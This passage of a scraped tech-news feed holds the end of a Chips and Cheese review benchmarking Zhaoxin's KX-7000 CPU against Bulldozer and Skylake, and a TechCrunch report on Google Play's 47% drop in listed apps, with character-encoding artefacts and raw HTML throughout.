href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png" width="359" height="198" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:198,&quot;width&quot;:359,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8340,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b1d5e2c-f4c1-4446-8088-2aa0a33aa108_359x198.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Sometimes, the memory subsystem has to satisfy a request by retrieving data from a peer coreâ€™s cache. These cases are rare in practice, but can give insight into system topology. The KX-7000 posts relatively high but even latency in a core-to-core latency test. Some core pairs see lower latency than others, likely depending on which L3 slice the tested address belongs to.</p><p>Compared to LuJiaZui, Century Avenue posts a huge 48.8% gain in SPEC CPU2017â€™s integer suite, and provides more than a 2x speedup in the floating point suite. Zhaoxin has been busy over the past few years, and that work has paid off. Against high performance western x86-64 chips, the KX-7000 falls just short of AMDâ€™s Bulldozer in the integer suite. The FX-8150 leads by 13.6% there. Zhaoxin flips things around in the floating point suite, drawing 10.4% ahead of Bulldozer.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png" width="827" height="483" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:483,&quot;width&quot;:827,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4938,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7d39af6d-2533-46bc-b30e-c03f69fca71c_827x483.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Newer cores like Broadwell or Skylake land on a different performance planet compared to Century Avenue, so Bulldozer is the best relative comparison. Against Bulldozer, Century Avenue tends to do best in </span><a href="https://chipsandcheese.com/p/running-spec-cpu2017-at-chips-and-cheese" rel="">higher-IPC tests </a><span>like 500.perlbench, 548.exchange2, and 525.x264. I suspect Century Avenueâ€™s additional execution resources give it an advantage in those tests. Meanwhile Bulldozer bulldozes the KX-7000 in low IPC tests like 505.mcf and 520.omnetpp. Those tests present a nasty cocktail of difficult-to-predict branches and large memory footprints. Bulldozerâ€™s comparatively strong memory subsystem and faster branch predictor likely give it a win there.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png" width="794" height="716" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:716,&quot;width&quot;:794,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:7286,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F961782d0-a7c1-47c2-a391-c398449e0dd2_794x716.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>SPEC CPU2017â€™s floating point suite generally consists of higher IPC workloads, which hands the advantage to the KX-7000. However, the FX-8150 snatches occasional victories. 549.fotonik3d is a challenging low IPC workload that sees even recent cores heavily limited by cache misses. Bulldozer walks away with an impressive 46.2% lead in that workload. At the other end, 538.imagick basically doesnâ€™t see L2 misses.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png" width="795" height="742" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/adc12108-5b81-4704-8ce9-532fd82882f7_795x742.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:742,&quot;width&quot;:795,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:8584,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadc12108-5b81-4704-8ce9-532fd82882f7_795x742.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Overall the SPEC CPU2017 results suggest the KX-7000 can deliver single-threaded performance roughly on par with AMDâ€™s Bulldozer.</p><p>Having eight cores is one of the KX-7000â€™s relative strengths against the FX-8150 and Core i5-6600K. However, multithreaded results are a mixed bag. libx264 software video encoding can take advantage of AVX2, and uses more than four threads. However, the KX-7000 is soundly beaten even by Bulldozer. 7-Zip compression uses scalar integer instructions. With AVX2 not playing a role, Bulldozer and the Core i5-6600K score even larger wins.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png" width="953" height="572" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:572,&quot;width&quot;:953,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9632,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://chipsandcheese.com/i/162504120?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F372e0e02-a4c8-4e43-acdc-edf2b422651b_953x572.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The KX-7000 turns in a better performance in Y-Cruncher, possibly with AVX2 giving it a large advantage over Bulldozer. However, eight Century Avenue cores still fail to match four Skylake ones. For a final test, OpenSSL RSA2048 signs are a purely integer operation that focuses on core compute power rather than memory access. Theyâ€™re particularly important for web servers, which have to validate their identity when clients establish SSL/TLS connections. Zhaoxin again beats Bulldozer in that workload, but falls behind Skylake.</p><p>Zhaoxin inherits VIAâ€™s x86 license, but plays a different ball game. VIA focused on low-power, low-cost applications. While Centaur CNS did branch into somewhat higher performance targets with a 4-wide design, the company never sought to tap into the wider general purpose compute market like AMD and Intel. Creating a high-clocking, high-IPC core that excels in everything from web browsing to gaming to video encoding is a massive engineering challenge. VIA reasonably decided to find a niche, rather than take AMD and Intel head-on without the engineering resources to match.</p><p>However Zhaoxin is part of Chinaâ€™s effort to build domestic chips in case western ones become unavailable. Doing so is a matter of national importance, so companies like Zhaoxin can expect massive government support, and survive even without being profitable. Zhaoxinâ€™s chips donâ€™t need to directly compete with AMD and Intel. But AMD and Intelâ€™s chips have driven performance expectations from application developers. China needs chips with enough performance to substitute western chips without being disruptively slow.</p><p>Century Avenue is an obvious attempt to get into that position, stepping away from LuJiaZuiâ€™s low power and low performance design. At a high level, Century Avenue represents good progress. A 4-wide &gt;3 GHz core with Bulldozer-level performance is a huge step up. At a lower level, it feels like Zhaoxin tried to make everything bigger without slowing down and making sure the whole picture makes sense. Century Avenue has 2Ã—256-bit FMA units, which suggest Zhaoxin is trying to get the most out of AVX2. However Century Avenue has low cache bandwidth and internally tracks 256-bit instructions as a pair of micro-ops. Doing so suits a minimum-cost AVX2 implementation geared towards compatibility rather than high performance. Besides AVX2, Century Avenue has small register files relative to its ROB capacity, which hinders its ability to make use of its theoretical out-of-order window.</p><p>Zooming out to the system level shows the same pattern. Century Avenueâ€™s L2 is too small considering it has to shield cores from 80+ cycle L3 latency. The KX-7000â€™s DRAM read bandwidth is inadequate for an octa-core setup, and the memory subsystem does a poor job of ensuring fairness under high bandwidth load. Besides unbalanced characteristics, Century Avenueâ€™s high frontend latency and lack of branch fusion make it feel like a 2005-era core, not a 2025 one.</p><p>Ultimately performance is what matters to an end-user. In that respect, the KX-7000 sometimes falls behind Bulldozer in multithreaded workloads. Itâ€™s disappointing from the perspective that Bulldozer is a 2011-era design, with pairs of hardware thread sharing a frontend and floating point unit. Single-threaded performance is similarly unimpressive. It roughly matches Bulldozer there, but the FX-8150â€™s single-threaded performance was one of its greatest weaknesses even back in 2011. But of course, the KX-7000 isnâ€™t trying to impress western consumers. Itâ€™s trying to provide a usable experience without relying on foreign companies. In that respect, Bulldozer-level single-threaded performance is plenty. And while Century Avenue lacks the balance and sophistication that a modern AMD, Arm, or Intel core is likely to display, itâ€™s a good step in Zhaoxinâ€™s effort to break into higher performance targets.</p><p><span>If you like the content then consider heading over to the </span><a href="https://www.patreon.com/ChipsandCheese" rel="">Patreon</a><span> or </span><a href="https://www.paypal.com/donate/?hosted_button_id=4EMPH66SBGVSQ" rel="">PayPal</a><span> if you want to toss a few bucks to Chips and Cheese. Also consider joining the </span><a href="https://discord.gg/TwVnRhxgY2" rel="">Discord</a><span>.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google Play sees 47% decline in apps since start of last year (316 pts)]]></title>
            <link>https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/</link>
            <guid>43849383</guid>
            <pubDate>Wed, 30 Apr 2025 19:03:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/">https://techcrunch.com/2025/04/29/google-play-sees-47-decline-in-apps-since-start-of-last-year/</a>, See on <a href="https://news.ycombinator.com/item?id=43849383">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p id="speakable-summary">Google Playâ€™s app marketplace is losing apps. </p>

<p>From the start of 2024 to the present, the Android app marketplace went from hosting about 3.4 million apps worldwide to just around 1.8 million, according to a new analysis by app intelligence provider <a href="http://appfigures.com/" target="_blank" rel="noreferrer noopener nofollow">Appfigures</a>. Thatâ€™s a decline of about 47%, representing a significant purge of the apps that have been available to Android users globally.</p>







<p>The decline is not part of some larger global trend, the firm also notes. During the same period, Appleâ€™s iOS App Store went from hosting 1.6 million apps to now just around 1.64 million apps, for instance â€” a slight increase. </p>

<p>In Googleâ€™s case, the decline in apps could be a relief for Android device owners who have had to sort through scammy, spammy, and otherwise poor-quality apps to find the best ones to install. The reduction could also help developers who have had to fight for visibility.</p>

<p>Over the years, Google Playâ€™s less stringent requirements for app review have led to the marketplace being overrun with lower-quality apps. While Apple continues to enforce strict app review measures before publication, Google often relies on automated checks combined with malware scans to speed up the app-review process. It tends to have a shorter app-review period as a result of its lighter touch in terms of human review.</p>

<p>In July 2024, Google announced it would <a href="https://www.theverge.com/2024/7/19/24201756/google-play-store-update-purge-low-quality-android-apps" target="_blank" rel="noreferrer noopener nofollow">raise the minimum quality requirements</a> for apps, which may have impacted the number of available Play Store app listings.</p>

<p>Instead of only banning broken apps that crashed, wouldnâ€™t install, or run properly, the company said it would begin banning apps that demonstrated â€œlimited functionality and content.â€ That <a href="https://support.google.com/googleplay/android-developer/answer/9898783?visit_id=638815444407149704-1010793115&amp;rd=1#1&amp;2&amp;3&amp;4&amp;5&amp;6&amp;7&amp;87&amp;9&amp;zippy=%2Cexamples-of-common-violations" target="_blank" rel="noreferrer noopener nofollow">included static apps</a> without app-specific features, such as text-only apps or PDF-file apps. It also included apps that provided little content, like those that only offered a single wallpaper. Additionally, Google banned apps that were designed to do nothing or have no function, which may have been tests or other abandoned developer efforts.</p>
<div>
		
		<p>Techcrunch event</p>
		<div>
			
			<p><span>Berkeley, CA</span>
													<span>|</span>
													<span>June 5</span>
							</p>
							<p><a href="https://techcrunch.com/events/tc-sessions-ai/exhibit/?promo=tc_inline_exhibit&amp;utm_campaign=tcsessionsai2025&amp;utm_content=exhibit&amp;utm_medium=ad&amp;utm_source=tc">
					<span>BOOK NOW</span>
				</a>
					</p></div>
	</div>

<p>Reached for comment, Google confirmed that its new policies were factors here, which also included an expanded set of <a href="https://android-developers.googleblog.com/2023/07/boosting-trust-and-transparency-in-google-play.html" target="_blank" rel="noreferrer noopener nofollow">verification requirements</a>, <a href="https://android-developers.googleblog.com/2023/11/ensuring-high-quality-apps-on-google-play.html#:~:text=Required%20app%20testing" target="_blank" rel="noreferrer noopener nofollow">required app testing</a> for new personal developer accounts, and <a href="https://android-developers.googleblog.com/2023/11/ensuring-high-quality-apps-on-google-play.html#:~:text=Increased%20investment%20in%20app%20review" target="_blank" rel="noreferrer noopener nofollow">expanded human reviews</a> to check for apps that try to deceive or defraud users.</p>

<p>In addition, the company pointed to other 2024 investments in AI for threat detection, stronger privacy policies, improved developer tools, and more. As a result, Google <a href="https://security.googleblog.com/2025/01/how-we-kept-google-play-android-app-ecosystem-safe-2024.html" target="_blank" rel="noreferrer noopener nofollow">prevented</a> 2.36 million policy-violating apps from being published on its Play Store and banned more than 158,000 developer accounts that had attempted to publish harmful apps, it said. </p>

<p>One factor Google didnâ€™t cite was the new trader status rule enforced by the EU as of this February, which began requiring developers to share their names and addresses in the appâ€™s listing. Those who failed to do so would see their apps removed from EU app stores. (Itâ€™s worth pointing out that Apple <a href="https://developer.apple.com/news/?id=yfacfeal" target="_blank" rel="noreferrer noopener nofollow">also began requiring trader status</a> information in February and did not see a decline in available apps as a result.)</p>







<p>Appfigures additionally notes it began seeing a decline in the number of apps on the Google Play Store even before the official start of the purge last summer; it doesnâ€™t yet have an explanation for this change. However, the firm says there have been 10,400 releases on Google Play so far this year, up 7.1% year-over-year as of April.</p>

<figure><img loading="lazy" decoding="async" width="788" height="786" src="https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?w=680" alt="" srcset="https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png 788w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=150,150 150w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=300,300 300w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=768,766 768w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=680,678 680w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=430,430 430w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=720,718 720w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=668,666 668w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=376,375 376w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=619,617 619w, https://techcrunch.com/wp-content/uploads/2025/04/appfigures-google-play-apps-removed-by-category-worldwide-19apr25.png?resize=532,531 532w" sizes="auto, (max-width: 788px) 100vw, 788px"></figure>


</div><div>
	
	
	
	

	
<div>
	<p>Sarah has worked as a reporter for TechCrunch since August 2011. She joined the company after having previously spent over three years at ReadWriteWeb. Prior to her work as a reporter, Sarah worked in I.T. across a number of industries, including banking, retail and software.</p>
</div>


	
	<p>
